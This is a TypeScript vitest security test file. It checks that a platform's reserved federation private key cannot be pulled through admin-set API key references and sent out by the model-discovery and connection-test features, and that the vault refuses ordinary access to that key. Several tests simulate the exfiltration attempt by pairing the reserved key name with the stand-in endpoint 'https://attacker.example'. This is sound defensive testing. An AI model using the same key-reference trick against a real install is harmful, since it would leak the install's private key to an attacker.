/**
 * The federation private key is out of reach of every admin-supplied vault
 * reference (docs/plans/federation-spec.md §4.1). A model's `apiKeyRef` is a
 * vault name an admin types; naming the reserved `federation.identity` must
 * not turn the Test or Fetch Models buttons into a way to send the install's
 * private key to an endpoint the admin controls.
 *
 * Backed by ephemeral PGlite and the real vault; the outbound fetches are
 * spies that record what would have left.
 */
import { randomBytes } from 'node:crypto';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, beforeEach, describe, expect, test, vi } from 'vitest';

const rand = (n: number) => randomBytes(n).toString('hex');
process.env.MASTER_KEY ??= `test-master-${rand(24)}`;
process.env.JWT_SECRET ??= `test-jwt-${rand(24)}`;
process.env.SESSION_SECRET ??= `test-session-${rand(24)}`;
process.env.LOG_LEVEL ??= 'error';

const fetchGuarded = vi.hoisted(() => vi.fn());
vi.mock('@/utils/sanitize', async (importOriginal) => ({
  ...(await importOriginal<typeof import('@/utils/sanitize')>()),
  fetchGuarded: (...a: unknown[]) => fetchGuarded(...a),
}));

const NAME = 'federation.identity';
let pem: string;
const fetchSpy = vi.fn();

beforeAll(async () => {
  process.env.STORAGE_MODE = 'embedded';
  process.env.DATA_DIR = mkdtempSync(join(tmpdir(), 'octipus-reserved-secret-'));
  const { initializeDb } = await import('@/db/postgres');
  await initializeDb();
  const { runMigrations } = await import('@/db/migrate');
  await runMigrations();
  const { initializeVault, _resetVaultForTests } = await import('@/security/vault');
  _resetVaultForTests();
  await initializeVault();
  const { getInstanceIdentity } = await import('@/core/federation/identity');
  await getInstanceIdentity();
  pem = (await (await import('@/security/vault')).getVault().getReservedSystemSecret(NAME)) as string;
  expect(pem).toContain('PRIVATE KEY');
});

beforeEach(() => {
  fetchGuarded.mockReset();
  fetchGuarded.mockResolvedValue({ ok: true, json: async () => ({ data: [] }) });
  fetchSpy.mockReset();
  vi.stubGlobal('fetch', fetchSpy);
});

afterAll(async () => {
  vi.unstubAllGlobals();
  const { closeDb } = await import('@/db/postgres');
  await closeDb();
});

/** Every header and URL of every recorded outbound call, as one string. */
function everythingSent(): string {
  return JSON.stringify([...fetchGuarded.mock.calls, ...fetchSpy.mock.calls]);
}

describe('apiKeyRef = federation.identity', () => {
  test('Fetch Models (discover) refuses it and sends nothing', async () => {
    const { discoverCustomModels } = await import('./provider-service');
    for (const provider of ['custom-openai', 'custom-anthropic', 'custom-gemini']) {
      const r = await discoverCustomModels({ provider, endpoint: 'https://attacker.example', apiKeyRef: NAME, userId: 'system' });
      expect(r.configured).toBe(false);
      expect(r.error).toMatch(/Could not resolve API key/);
    }
    expect(fetchGuarded).not.toHaveBeenCalled();
    expect(everythingSent()).not.toContain('PRIVATE KEY');
  });

  test('Test (testModelConnection) refuses it and sends nothing', async () => {
    const { testModelConnection } = await import('./provider-service');
    const r = await testModelConnection({
      provider: 'custom-openai',
      modelId: 'm',
      endpoint: 'https://attacker.example',
      apiKeyRef: NAME,
      metadata: { customProvider: { auth: { type: 'bearer' } } } as never,
      userId: 'system',
    });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/Could not resolve API key/);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(everythingSent()).not.toContain(pem.slice(40, 80));
  });

  test('an install model row naming it resolves no key', async () => {
    const { resolveModelKey } = await import('@/models/model-key');
    const key = await resolveModelKey({ name: 'evil', apiKeyRef: NAME, ownerUserId: null, provider: 'custom-openai' }, null);
    expect(key).toBeUndefined();
  });
});

describe('the vault itself refuses the reserved name', () => {
  test('every ordinary read and write throws ReservedSecretError; list and access checks leave it out', async () => {
    const { getVault, ReservedSecretError } = await import('@/security/vault');
    const vault = getVault();
    const { queryRaw } = await import('@/db/postgres');
    const [{ id }] = (await queryRaw(`SELECT id FROM vault WHERE name = $1 AND scope = 'system' AND is_active`, [NAME])).rows as { id: string }[];

    await expect(vault.getByName('system', NAME)).rejects.toBeInstanceOf(ReservedSecretError);
    await expect(vault.get('system', id)).rejects.toBeInstanceOf(ReservedSecretError);
    await expect(vault.store('system', NAME, 'x', { credentialType: 'api_key' })).rejects.toBeInstanceOf(ReservedSecretError);
    await expect(vault.setSystemSecret(NAME, 'x')).rejects.toBeInstanceOf(ReservedSecretError);
    await expect(vault.update('system', id, { value: 'x' })).rejects.toBeInstanceOf(ReservedSecretError);
    await expect(vault.rotate('system', id, 'x')).rejects.toBeInstanceOf(ReservedSecretError);
    await expect(vault.delete('system', id)).rejects.toBeInstanceOf(ReservedSecretError);
    expect(await vault.getSystemSecret(NAME)).toBeNull();
    expect((await vault.list('system')).some((e) => e.name === NAME)).toBe(false);
    expect(await vault.canAccess('system', id, {})).toBe(false);
    expect(await vault.canAccessByName('system', NAME, {})).toBe(false);
    expect(await vault.getForAgent({ userId: 'system' }, NAME)).toBeNull();

    // Untouched, and still readable by the install itself.
    expect(await vault.getReservedSystemSecret(NAME)).toBe(pem);
    expect(await vault.isReservedSystemCredential(id)).toBe(true);
  });
});
